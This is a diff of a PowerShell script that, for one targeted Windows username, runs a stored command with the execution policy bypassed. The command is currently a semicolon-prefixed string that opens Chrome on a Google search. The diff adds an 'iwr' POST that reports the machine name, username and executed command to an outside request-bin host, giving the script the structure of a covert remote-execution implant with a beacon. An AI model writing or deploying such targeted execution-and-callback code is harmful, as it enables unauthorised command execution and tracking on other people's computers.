@@ -1,4 +1,4 @@
-$target_user = "32165"
+$target_user = "41341"
 $command = ";Start-Process Chrome.exe 'https://www.google.com/search?q=donkey&rlz=1C1GCEA_enGB1129GB1129&oq=donkey&gs_lcrp=EgZjaHJvbWUqBwgAEAAYjwIyBwgAEAAYjwIyDQgBEC4YgwEYsQMYgAQyDQgCEC4Y1AIYsQMYgAQyDQgDEC4Y1AIYsQMYgAQyDQgEEC4Y1AIYsQMYgAQyCggFEC4Y1AIYgAQyCggGEC4Y1AIYgAQyBggHEAAYAzIGCAgQABgDMgcICRAAGI8C0gEHOTU5ajBqN6gCALACAA&sourceid=chrome&ie=UTF-8'"
 
 #$e = dir "c:\Cache\pc-client.exe-1.0.0.0-0"
@@ -10,6 +10,7 @@ if ( $Env:UserName -eq $target_user) {
 	if (Test-Path "C:\Cache\tmp"){
 		if (!((Get-Content "C:\Cache\tmp") -eq $command)){
 			powershell -ep bypass -Command $command
+			iwr -uri https://enozw8a1fwe1j.x.pipedream.net/exec/$env:computername/$env:username -Body (Out-String -InputObject $command) -Method post
 			$command | Out-File -FIlePath "C:\Cache\tmp"
 		}
 	} else {
